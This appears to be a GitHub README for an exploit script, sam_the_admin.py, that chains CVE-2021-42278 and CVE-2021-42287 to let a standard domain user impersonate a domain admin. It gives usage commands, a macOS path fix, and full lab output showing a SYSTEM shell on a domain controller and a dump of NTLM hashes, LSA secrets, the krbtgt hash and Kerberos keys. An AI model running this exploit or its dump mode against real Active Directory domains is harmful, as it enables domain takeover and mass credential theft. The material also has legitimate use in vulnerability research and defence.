# Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user



## For MacOS User

error:

```bash
sh: /usr/bin/impacket-smbexec: No such file or directory
```

change `sam_the_admin.py`:
```python
    # will do something else later on 
    fbinary = "/usr/local/bin/smbexec.py"
    # "/usr/bin/impacket-smbexec"
    if options.dump:
        fbinary = "/usr/local/bin/secretsdump.py"
        # "/usr/bin/impacket-secretsdump"
```

## OS TEST
![image](https://user-images.githubusercontent.com/16593068/146142564-5d573b4e-549e-4ae0-9bfd-72d5fce67108.png)

```bash

Nmap scan report for 172.16.242.135
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-12-15 07:45:26Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: jas502n.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2012 R2 Datacenter 9600 microsoft-ds (workgroup: JAS502N)
```

usage:

`python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell`

![image](https://user-images.githubusercontent.com/16593068/146140741-c00f1618-92c8-4d1f-be0c-781e4f660aed.png)

```bash
$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Selected Target dc01.jas502n.com
[*] Total Domain Admins 1
[*] will try to impersonat Administrator
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-91$"
[*] MachineAccount "SAMTHEADMIN-91$" password = OHjbpG6omtbD
[*] Successfully added machine account SAMTHEADMIN-91$ with password OHjbpG6omtbD.
[*] SAMTHEADMIN-91$ object = CN=SAMTHEADMIN-91,CN=Computers,DC=jas502n,DC=com
[*] SAMTHEADMIN-91$ sAMAccountName == dc01
[*] Saving ticket in dc01.ccache
[*] Resting the machine account to SAMTHEADMIN-91$
[*] Restored SAMTHEADMIN-91$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving ticket in Administrator.ccache
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec

Windows IP ����


��̫�������� Ethernet0:

   �����ض��� DNS ��׺ . . . . . . . :
   IPv4 ��ַ . . . . . . . . . . . . : 172.16.242.135
   ��������  . . . . . . . . . . . . : 255.255.255.0
   Ĭ������. . . . . . . . . . . . . : 172.16.242.2

���������� isatap.{B575E710-D7D9-44AD-B5AF-77922F8E0DAF}:

   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
   �����ض��� DNS ��׺ . . . . . . . :

C:\Windows\system32>whoami
nt authority\system
```

### dump

`python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dum`

![image](https://user-images.githubusercontent.com/16593068/146141208-6c78d753-1655-4353-b105-46cea824f066.png)


```
$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dump                                                                                                                                         1 ↵
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Selected Target dc01.jas502n.com
[*] Total Domain Admins 1
[*] will try to impersonat Administrator
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-78$"
[*] MachineAccount "SAMTHEADMIN-78$" password = @jokz76QG*AM
[*] Successfully added machine account SAMTHEADMIN-78$ with password @jokz76QG*AM.
[*] SAMTHEADMIN-78$ object = CN=SAMTHEADMIN-78,CN=Computers,DC=jas502n,DC=com
[*] SAMTHEADMIN-78$ sAMAccountName == dc01
[*] Saving ticket in dc01.ccache
[*] Resting the machine account to SAMTHEADMIN-78$
[*] Restored SAMTHEADMIN-78$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving ticket in Administrator.ccache
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xf55f3cbfbd2cd42d781e383341084ff5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
JAS502N\DC01$:plain_password_hex:2f94db0890b6a5f907720def3b4b09c3b55be82100bd08ca56f9a2ad1ecaeef2be4ee85a48c1b8803711c66e0249a73d775e9a0d1e876dd02cb8fb416b2675ae70cdb98f7470db69e45f269b6112e27c089e81bc76bc44b785b125e77a24cd72b9f9f94147a7f0b1beb10aa8a27a708abc75657b797c9885948bae7930bbe94ee7df51982bf32e2e8fad30851cd271f3ad8a0307c913862565d1245752ae11d58271dea21d4c352ab8688da57e576920e17dc43ff4448a42a367c28d6bca4a994bafc1adbeec7829dc1f0c72cfb91c64a16373c4999af197c1d6bd5b24fb1713cb022573fe76ad43350fa2f3b140cb78
JAS502N\DC01$:aad3b435b51404eeaad3b435b51404ee:e7907d9bd5c9af5b3656ba4d25f6598a:::
[*] DefaultPassword
JAS502N\John:Admin@1234
[*] DPAPI_SYSTEM
dpapi_machinekey:0x82e26ecbad0aebdd842f94c0ffb143a7c14a5db5
dpapi_userkey:0xa4844cdd37f4cbf8ae8124d8dd4e5c3f6ca6464c
[*] NL$KM
 0000   9E D7 B9 42 7C F7 60 16  5F EF FF B0 70 59 2E 3D   ...B|.`._...pY.=
 0010   C7 42 46 35 1A C7 32 F5  D8 32 2D A7 28 32 85 27   .BF5..2..2-.(2.'
 0020   63 CB 07 0E 69 A8 B0 FC  4D 28 27 6E 83 FE 3B C9   c...i...M('n..;.
 0030   A5 95 43 A6 E3 A7 51 5B  1D 2B 47 D1 F8 E8 8A E3   ..C...Q[.+G.....
NL$KM:9ed7b9427cf760165fefffb070592e3dc74246351ac732f5d8322da72832852763cb070e69a8b0fc4d28276e83fe3bc9a59543a6e3a7515b1d2b47d1f8e88ae3
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b6b30cfccbbdb8fb0794ec82a66d72c2:::
John:1001:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:e7907d9bd5c9af5b3656ba4d25f6598a:::
SAMTHEADMIN-44$:1105:aad3b435b51404eeaad3b435b51404ee:9b8943da3e4d08bb4eeda6083b43f4df:::
SAMTHEADMIN-72$:1106:aad3b435b51404eeaad3b435b51404ee:2b686a3365e02a29f6285a3a9f13c488:::
SAMTHEADMIN-62$:1107:aad3b435b51404eeaad3b435b51404ee:a7668490eafcc881b4a3c34df81dea3e:::
SAMTHEADMIN-91$:1108:aad3b435b51404eeaad3b435b51404ee:e7587bf6d6698070d38a5a5676fc55cb:::
SAMTHEADMIN-67$:1109:aad3b435b51404eeaad3b435b51404ee:04c1979c68b6ff4f1f5d311d5d4d3c39:::
SAMTHEADMIN-78$:1110:aad3b435b51404eeaad3b435b51404ee:bd78fe7660b5d9acf9316b9a4241cbae:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:027944be67b0bca525b31477ad6670e6098d5c02603b5c65b6f486612c0a4b38
krbtgt:aes128-cts-hmac-sha1-96:2e7d56e7e389a2fee932e0c30d1d0c85
krbtgt:des-cbc-md5:e9b008aba2fe104c
John:aes256-cts-hmac-sha1-96:d6d44e5dd489893fbf5a260aafd211690aec432ea8c10ca62153b8b4fd596031
John:aes128-cts-hmac-sha1-96:1d8605001c381bb41cec82ce88e21946
John:des-cbc-md5:153b16c28c43ab61
DC01$:aes256-cts-hmac-sha1-96:122296fbd80141258ff85999d1a51a47567444a2674e214f497160947fc03705
DC01$:aes128-cts-hmac-sha1-96:da332729028749b391eb63617e179638
DC01$:des-cbc-md5:15df37f4a4d39232
SAMTHEADMIN-44$:aes256-cts-hmac-sha1-96:2253c5bb37613bb8c0aacb144e794d88e31ad4ca427375af539875755a6849f7
SAMTHEADMIN-44$:aes128-cts-hmac-sha1-96:78c325052c7532165e61cffe11fd0db3
SAMTHEADMIN-44$:des-cbc-md5:581ffdab3101d979
SAMTHEADMIN-72$:aes256-cts-hmac-sha1-96:d74516f3892ea272feee8d8b13fe82372b4368aa717a28ad40b89f1233743fa6
SAMTHEADMIN-72$:aes128-cts-hmac-sha1-96:0271403dbb8479cc61ba9b6419e9788a
SAMTHEADMIN-72$:des-cbc-md5:efd39b614c196b15
SAMTHEADMIN-62$:aes256-cts-hmac-sha1-96:ebb686e9ab0a8bd7670fffa453bbafbf4597ccb5d46c1927a39859e0aa8049ab
SAMTHEADMIN-62$:aes128-cts-hmac-sha1-96:d377d5572dd1f15769d6b5ebb03900a9
SAMTHEADMIN-62$:des-cbc-md5:6d291c646dbf6b01
SAMTHEADMIN-91$:aes256-cts-hmac-sha1-96:d9f159266b528d030e375c97ba63f4d076eeba9143e4ef590aeba45b348a8272
SAMTHEADMIN-91$:aes128-cts-hmac-sha1-96:3031b7017785f9a0a84a21e7962c8c10
SAMTHEADMIN-91$:des-cbc-md5:c8ce92bca79b1f34
SAMTHEADMIN-67$:aes256-cts-hmac-sha1-96:c946319e2293c410b6b954efe815c10150b0fd18a67695ed374e6ee8a6a35960
SAMTHEADMIN-67$:aes128-cts-hmac-sha1-96:074ff951dc7667b1732f1cf105fbb6b0
SAMTHEADMIN-67$:des-cbc-md5:ada7fe83c26b190d
SAMTHEADMIN-78$:aes256-cts-hmac-sha1-96:3b822a9a645c80f2f00d8b00cd3d657eedacded7f60d3d56563b348ee0379e65
SAMTHEADMIN-78$:aes128-cts-hmac-sha1-96:bd7b8c86df42d90d354f586a72061046
SAMTHEADMIN-78$:des-cbc-md5:b6c8865764e65734
[*] Cleaning up...
```



Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

[![asciicast](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm.svg)](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm)

### Known issues
- it will not work outside kali , i will update it later on :)

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
